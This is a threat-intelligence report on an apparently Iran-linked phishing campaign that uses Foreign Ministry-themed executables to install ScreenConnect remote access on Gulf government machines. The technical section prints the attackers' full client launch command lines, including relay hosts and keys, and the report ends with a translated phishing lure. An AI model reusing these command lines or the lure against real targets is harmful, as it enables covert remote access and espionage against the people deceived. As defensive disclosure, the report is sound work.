ScreenConnect Remote Access Tool Utilizing Ministry of Foreign Affairs-Themed EXEs and URLs
Authored by: Gage Mele, Winston Marydasan, and Yury Polozov

Key Findings
Anomali Threat Research identified a campaign targeting government agencies in the United Arab Emirates (UAE) and likely the
broader Middle East.
We assess with medium confidence that the activity is being conducted by Iran-nexus cyberespionage group Static Kitten, due to Israeli
geopolitical-themed lures, Ministry of Foreign Affairs (MOFA) references, and the use of file-storage service Onehub that was attributed
to their previous campaign known as Operation Quicksand.[1]
The objective of this activity is to install a remote management tool called ScreenConnect (acquired by ConnectWise 2015) with unique
launch parameters that have custom properties.
Malicious executables and URLs used in this campaign are masquerading as the Ministry of Foreign Affairs (MOFA) of Kuwait
(mofa.gov[.]kw).
Another sample, including only MOFA (mfa.gov), could be used for broader government targeting.

Overview
Anomali Threat Research has uncovered malicious activity very likely attributed to the Iran-nexus cyberespionage group, Static Kitten
(Seedworm, MERCURY, Temp.Zagros, POWERSTATS, NTSTATS, MuddyWater), which is known to target numerous sectors primarily
located in the Middle East.[2] This new campaign, which uses tactics, techniques, and procedures (TTPs) consistent with previous Static
Kitten activity, uses ScreenConnect launch parameters designed to target any MOFA with mfa[.]gov as part of the custom field. We found
samples specifically masquerading as the Kuwaiti government and the UAE National Council respectively, based on references in the
malicious samples.
In mid-2020, the UAE and Israel began the process of normalizing relations. Since then, tensions have further escalated in the region, as
reported by numerous sources. The targeting of Kuwait could be tied to multiple factors, including Kuwait’s MOFA making a public statement
that they were willing to lead mediation between Iran and Saudi Arabia.[3] Furthermore, in October 2020, trade numbers for a peace deal
between Israel and UAE included an estimate for the creation of 15,000 jobs and $2 billion in revenue on each side.[4] In that same month,
Static Kitten reportedly conducted Operation Quicksand, which targeted prominent Israeli organizations and included the use of file-storage
service OneHub.[5]

Details
We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between
Arab countries and Israel, or a file relating to scholarships. The URLs distributed through these phishing emails direct recipients to the
intended file storage location on Onehub, a legitimate service known to be used by Static Kitten for nefarious purposes.[6] Anomali Threat
Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.
The delivery URLs found to be part of this campaign are:
ws.onehub[.]com/files/7w1372el
ws.onehub[.]com/files/94otjyvd
File names in this campaign include:
‫ ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ‬httpsmod[.]gov.kw.ZIP
‫ ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ‬httpsmod[.]gov.kw.exe
‫ اﻟﺪراﺳﯿﺔ‬.zip
‫ اﻟﺪراﺳﯿﺔ‬.exe
‫ ﻣﺸﺮوع‬.docx

Analysis and study of the normalization of relations between the Arab countries and Israel httpsmod.gov.kw.zip
Analysis and study of the normalization of relations between the Arab countries and Israel httpsmod.gov.kw.exe
Scholarships.zip
Scholarships.exe
Project.docx
Static Kitten’s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing
email that impersonates an EXE (‫ ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ‬httpsmod[.]gov.kw.exe). This EXE purports to be a report on
Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.

2/8

A similar second sample uses .docx file that tries to direct users to ws.onehub[.]com/files/94otjyvd which downloads a ZIP file called ‫ﻟﺪراﺳﯿﺔ‬
.zip. An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed. An overview of the
infection chain is shown in Figure 1below.

Figure 1 - Static Kitten Campaign Infection Chain

Lure Document Analysis
Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency
employees. The URLs are distributed through phishing emails with lure and decoy documents. An example lure is shown in Figure 2 below.

Figure 2 – Static Kitten Lure Document .docx
The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the
impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel. The actors reference
multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National
Media Council, likely in an effort to add the appearance of legitimacy. A full translation of this document can be viewed in Appendix A. The
hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to
ws.onehub.com/files/7w1372el.

3/8

The second file is a ZIP called ‫ اﻟﺪراﺳﯿﺔ‬.zip (see Figure 3). We cannot determine the delivery method for this ZIP, but it is likely similar to the
.docx email delivery method of the first download URL. The geopolitical-themed ZIP contains an EXE file with the same name that begins the
installation process for ScreenConnect when executed (see Figure 4).

Technical Analysis
ScreenConnect and OneHub Context
Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors.
For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and
India-based Wipro.[7] The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them
to conduct further lateral movements and automated actions on objectives. During an incident impacting Cognizant and their client Maritz
Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift
card fraud scheme.[6] In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments. This
lead to the delivery of Zeppelin and other VegaLocker ransomware variants, Vidar information stealer, Cobalt Strike beacons, PS2EXE tools,
and banker Trojans.[7] In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD
SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]
Remote desktop management software is a common target and tool used by threat actors because of the wide variety of functionalities they
offer. ScreenConnect offers three primary functions that each contain different valuable features for threat actors. ScreenConnect’s
capabilities are shown in Table 1 below.
Table 1 - ScreenConnect Capabilities[9]
Feature

Functions

Remote Support

Remote control and viewing of any internet-connect device.

Unattended Access

Persistent connection allows behind-the-scenes, remote control of any machine or server.

Meetings

Standard screen-sharing meetings with chat and voice communication, record video, and take screenshots.

4/8

The cybercriminal group Graceful Spider (TA505, Gold Evergreen, TEMP.Warlock, Hive0065, Chimborazo, FIN11) distributed spearphishing
emails impersonating Onehub in 2019 in attempts to trick users into downloading the SDBbot remote access trojan (RAT).[10] Onehub’s filestorage services are also utilized in malspam emails to host various malware, as is common with other file storage locations abused by
multiple threat actors.

First Executable
‫ ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ‬httpsmod.gov.kw.exe
When a user tries to double click the executable ‫ ﺗﺤﻠﯿﻞ ودراﺳﺔ ﺗﻄﺒﯿﻊ اﻟﻌﻼﻗﺎت اﻟﺪول اﻟﻌﺮﺑﯿﺔ واﺳﺮاﺋﯿﻞ‬httpsmod.gov.kw.exe (Screenconnect payload), it
drops the Microsoft installer file. This begins the installation of the client payload onto victim machines. While the actors attempted to make
the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting. The
client service launch parameters are:
"C:\Program Files (x86)\ScreenConnect Client (a97eeae2330a1851)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=instanceuwct38-relay.screenconnect.com&p=443&s=defc756e-8027-47b6-b67f400b5152b0f9&k=BgIAAACkAABSU0ExAAgAAAEAAQAtuFTxmBL02KmPrJD46iRMPemIxmEf5ugjlUMfa193CjLMeH9pna2eM0ZGHYhe3MZHU
While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client
agent through a public key thumbprint. The thumbprint is a 16 character string located at "C:\Program Files (x86)\ScreenConnect Client
(a97eeae2330a1851)”
Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.
Table 2 - ScreenConnect Launch Parameters
Launch Parameter
e=Access

y=Guest

h=instance-sy9at2-relay.screenconnect.com

&t

The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:
&c=mofa
&c=mofa.gov.kw
These parameters contain predefined properties that can allow an actor to know which target, or from where, has been infected. In this
example the infected target is MOFA.

Second Executable
‫ اﻟﻤﻨﺢ اﻟﺪراﺳﯿﺔ‬.exe

5/8

The ScreenConnect launch parameters from ‫ اﻟﻤﻨﺢ اﻟﺪراﺳﯿﺔ‬.exe is shown below:
"C:\Program Files (x86)\ScreenConnect Client (03b9d0ec9210f109)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=instancesy9at2-relay.screenconnect.com&p=443&s=6a1e6739-ad4f-4759-8c69dfe896b9a817&k=BgIAAACkAABSU0ExAAgAAAEAAQCVzMmjXhdfu5xyqTHPWDSj9Qjbq%2bQlIQursvinhHWO9UWKiTPrrR7quzVCpids4AagF
The actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA:
&c=mfa&c=mfa.gov

Conclusion
Utilizing legitimate software for malicious purposes can be an effective way for threat actors to obfuscate their operations. In this latest
example, Static Kitten is very likely using features of ScreenConnect to steal sensitive information or download malware for additional cyber
operations. As Static Kitten is assessed to be primarily focused on cyberespionage, it is very likely that data-theft is the primary objective
behind propagating ScreenConnect to government agency employees.
We will continue monitoring this group for additional malicious activity and provide details when appropriate.

Gentlemen / employees of government agencies
Happy New Year
After a kind greeting ,,,
In view of the situation in the region, especially after the US elections, and concerns about Iran's actions, joint studies have been conducted
between the National Media Council and the General Secretariat of the Cooperation Council for the Arab States of the Gulf on counting the
political, security and economic consequences of the normalization of relations between Arab countries and Israel. Consequently, the draft
studies on negotiations on the normalization of relations between Arab countries and Israel were presented by experts of the member states
of the General Secretariat of the Cooperation Council for the Arab States of the Gulf, and in this regard, the National Media Council seeks to
conduct a comprehensive survey by the member states.
